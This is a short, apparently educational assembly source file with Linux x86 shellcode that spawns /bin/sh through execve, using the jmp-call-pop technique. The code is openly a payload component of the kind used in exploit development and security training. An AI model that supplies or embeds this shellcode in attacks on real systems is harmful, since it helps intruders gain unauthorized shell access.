    #
    # Execve /bin/sh Shellcode Via Pop (Linux x86)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 16 April 2015
    #
    # GPL
    #


    .global _start
_start:
    jmp just_before_str

execve_sh:
    # __NR_execve 11
    pushl $11
    popl %eax

    popl %ebx

    xorl %ecx, %ecx
    # xorl %edx, %edx

    int $0x80

just_before_str:
    call execve_sh
    .asciz "/bin/sh"
